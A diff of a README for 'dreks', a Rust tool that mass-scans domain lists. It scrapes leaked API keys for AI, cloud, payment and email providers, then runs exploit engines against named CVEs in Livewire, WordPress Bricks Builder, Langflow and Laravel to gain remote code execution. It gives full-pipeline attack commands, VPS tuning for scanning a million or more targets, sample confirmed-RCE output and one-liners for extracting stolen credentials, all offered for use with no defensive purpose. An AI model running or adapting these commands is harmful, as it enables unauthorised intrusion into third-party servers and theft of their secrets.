@@ -1,6 +1,6 @@
 # D-Scanner Rust
 
-High-performance web credential scanner. Rust rewrite of D-Scanner.
+High-performance web credential scanner with exploit engines. Rust rewrite of D-Scanner.
 
 ## Architecture
 
@@ -17,17 +17,20 @@ Domain list (file or stdin)
   Fetch Workers       -- per-target HTTP client, isolated cookie jar
         |
         v
-  Credential Scanner  -- 17 providers, regex per provider
+  Credential Scanner  -- 17 providers, regex per provider (M1)
         |
         v
-  Output (JSONL)      -- one JSON line per hit, stdout or file
+  Exploit Engines     -- livewire2shell, wp2shell, etc. (M2)
+        |
+        v
+  Output (JSONL)      -- M1 hits + RCE confirmed results
 ```
 
 ## Requirements
 
 - Rust 1.70 or later
 - Linux (Debian 12 recommended for production)
-- On Windows: MSYS2 with MinGW-w64 toolchain
+- VPS with good network (1Gbps+ recommended)
 
 ## Build
 
@@ -37,70 +40,200 @@ cargo build --release
 
 Binary: `./target/release/dreks`
 
-## Usage
+## Quick Start
 
 ```bash
-# Basic scan from file
-./target/release/dreks --input domains.txt
+# Basic scan (M1 only)
+./target/release/dreks --input domains.txt --output hits.jsonl
 
-# With options
-./target/release/dreks \
-  --input domains.txt \
-  --concurrency 2000 \
-  --timeout 10 \
-  --max-js 3 \
-  --output hits.jsonl \
-  --log-level info
-
-# Read from stdin
-cat domains.txt | ./target/release/dreks --input -
+# Full pipeline (M1 + M2 exploits)
+./target/release/dreks --input domains.txt --mode full \
+  --output m1_hits.jsonl --exploit-output rce_hits.jsonl
 ```
 
-## Options
+---
+
+## VPS Performance Guide
+
+### Throughput Formula
+
+```
+throughput = concurrency / avg_slot_time
+```
+
+| Parameter | Description |
+|-----------|-------------|
+| `concurrency` | `--exploit-concurrency` (parallel exploit attempts) |
+| `avg_slot_time` | `--exploit-timeout × 2` (total cap per batch) |
+
+### Recommended Configurations
+
+#### High Speed (126+ t/s)
+```bash
+./target/release/dreks --input targets.txt --mode full \
+  --output m1_hits.jsonl --exploit-output rce_hits.jsonl \
+  --exploit-timeout 4 --exploit-concurrency 800
+```
+- **Throughput:** 130+ t/s
+- **Trade-off:** May miss slow targets
+
+#### Balanced (100+ t/s)
+```bash
+./target/release/dreks --input targets.txt --mode full \
+  --output m1_hits.jsonl --exploit-output rce_hits.jsonl \
+  --exploit-timeout 5 --exploit-concurrency 700
+```
+- **Throughput:** 100-110 t/s
+- **Trade-off:** Good balance speed/coverage
+
+#### Thorough (slower but complete)
+```bash
+./target/release/dreks --input targets.txt --mode full \
+  --output m1_hits.jsonl --exploit-output rce_hits.jsonl \
+  --exploit-timeout 8 --exploit-concurrency 1000
+```
+- **Throughput:** 60-80 t/s
+- **Trade-off:** Catches slow targets
+
+### VPS Requirements
+
+| Targets | RAM | CPU | Bandwidth |
+|---------|-----|-----|-----------|
+| 10K | 2GB | 2 cores | 100Mbps |
+| 100K | 4GB | 4 cores | 500Mbps |
+| 1M+ | 8GB | 8 cores | 1Gbps |
+
+### Example: 3K Targets
+
+```bash
+# Typical result on good VPS:
+# 3082 targets / 23s = 134 t/s
+# M1 hits: 3185, RCE confirmed: 18-22
+
+time ./target/release/dreks --input targets.txt --mode full \
+  --output m1_hits.jsonl --exploit-output rce_hits.jsonl \
+  --exploit-timeout 4
+```
+
+---
+
+## CLI Options
+
+### M1: Credential Scan
 
 | Flag | Default | Description |
 |------|---------|-------------|
 | `--input` | `domains.txt` | Domain/URL list file. Use `-` for stdin |
 | `--concurrency` | `2000` | Max concurrent HTTP connections |
-| `--dns-servers` | `8.8.8.8,1.1.1.1,9.9.9.9,8.8.4.4` | DNS resolvers, comma-separated |
-| `--timeout` | `10` | HTTP connect timeout in seconds |
-| `--max-body` | `1048576` | Max body size to download in bytes |
+| `--dns-servers` | `8.8.8.8,1.1.1.1,...` | DNS resolvers, comma-separated |
+| `--timeout` | `10` | HTTP connect timeout (seconds) |
+| `--max-body` | `1048576` | Max body size to download (bytes) |
 | `--max-js` | `3` | Max JS files to fetch per domain |
-| `--output` | stdout | Output file path for JSONL hits |
+| `--output` | stdout | Output file for M1 JSONL hits |
 | `--log-level` | `info` | Log level: trace, debug, info, warn, error |
-| `--no-raw-dns` | false | Disable raw UDP DNS, use system resolver |
+| `--no-raw-dns` | false | Use system resolver instead of raw UDP |
+| `--skip-dns` | false | Input is pre-resolved (massdns format) |
+
+### M2: Exploit Engines
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | `scan` | Mode: `scan` (M1), `exploit` (M2), `full` (M1+M2) |
+| `--exploit-output` | stdout | Output file for RCE JSONL results |
+| `--exploit-concurrency` | `700` | Parallel exploit attempts |
+| `--exploit-timeout` | `5` | Per-request timeout (seconds). Total cap = timeout × 2 |
+| `--skip-dead-check` | false | Skip dead target pre-filter |
+
+---
+
+## Exploit Engines
+
+### livewire2shell
+- **Target:** Laravel Livewire v3 apps
+- **CVE:** CVE-2024-47823 (Arbitrary file read/RCE)
+- **Detection:** `/livewire/livewire.js`, `wire:` attributes
+
+### wp2shell
+- **Target:** WordPress sites
+- **Features:**
+  - Config backup detection (wp-config.php.bak, .env, etc.)
+  - VCS exposure (.git/config, .git/HEAD)
+  - Vulnerable plugin detection (8 known CVEs)
+  - User enumeration via REST API
+  - **CVE-2024-25600:** Bricks Builder RCE (≤1.9.6)
+
+### langflow2shell
+- **Target:** Langflow AI workflow apps
+- **CVE:** CVE-2025-3248 (Unauth code execution)
+
+### laravel2shell
+- **Target:** Laravel apps with debug mode
+- **Detection:** Debug page, env exposure
+
+---
 
 ## Output Format
 
-Each credential hit is printed as one JSON line:
-
+### M1 Hits (credentials)
 ```json
-{"target":"https://example.com","provider":"openai","value":"sk-proj-...","confidence":"high","source":"Html","found_at":"2026-09-28T15:00:00Z"}
+{"target":"https://example.com","provider":"openai","value":"sk-proj-...","confidence":"high","source":"Html","found_at":"2026-10-03T14:00:00Z"}
 ```
 
-## Credential Providers
+### M2 Hits (RCE)
+```json
+{"target":"https://example.com","engine":"livewire2shell","rce_cmd":"id","rce_output":"uid=33(www-data)...","confirmed_at":"2026-10-03T14:00:00Z"}
+```
 
-17 providers are currently implemented:
+---
 
-- OpenAI, Anthropic, Groq, xAI, OpenRouter, Replicate, Cerebras, Perplexity, HuggingFace
-- Stripe
-- AWS
-- GitHub, GitLab
-- SendGrid, Resend, Brevo, Mailgun
+## Credential Providers (M1)
 
-## Milestone Status
+17 providers implemented:
+- **AI:** OpenAI, Anthropic, Groq, xAI, OpenRouter, Replicate, Cerebras, Perplexity, HuggingFace
+- **Payment:** Stripe
+- **Cloud:** AWS
+- **Code:** GitHub, GitLab
+- **Email:** SendGrid, Resend, Brevo, Mailgun
 
-| Milestone | Description | Status |
-|-----------|-------------|--------|
-| M1 | Rust core: pipeline, DNS, HTTP, credential engine | Done |
-| M2 | Exploit engines: livewire2shell, laravel2shell, langflow2shell | Pending |
-| M3 | Exploit engines: wp2shell, react2shell, lib, recon | Pending |
-| M4 | Controller bridge, WebSocket, Telegram relay | Pending |
-| M5 | Docker deploy, benchmark, client documentation | Pending |
+---
 
-## Testing
+## Tips
 
-See [TESTING.md](TESTING.md) for the full test plan with 8 test cases.
+### Maximize Throughput
+```bash
+# Use lower timeout for fast scans
+--exploit-timeout 4
+
+# Increase concurrency on powerful VPS
+--exploit-concurrency 1000
+
+# Skip DNS for pre-resolved lists
+--skip-dns
+```
+
+### Analyze Results
+```bash
+# Count RCE by engine
+grep -oP '"engine":"[^"]+' rce_hits.jsonl | sort | uniq -c
+
+# Extract credentials
+jq -r '.value' m1_hits.jsonl | sort -u
+
+# Find specific CVE
+grep 'CVE-2024-25600' rce_hits.jsonl
+```
+
+### Large Scale Scanning
+```bash
+# Use massdns for DNS pre-resolution
+massdns -r resolvers.txt -o S domains.txt > resolved.txt
+
+# Then scan with skip-dns
+./target/release/dreks --input resolved.txt --mode full \
+  --skip-dns --output m1.jsonl --exploit-output rce.jsonl
+```
+
+---
 
 ## License
 
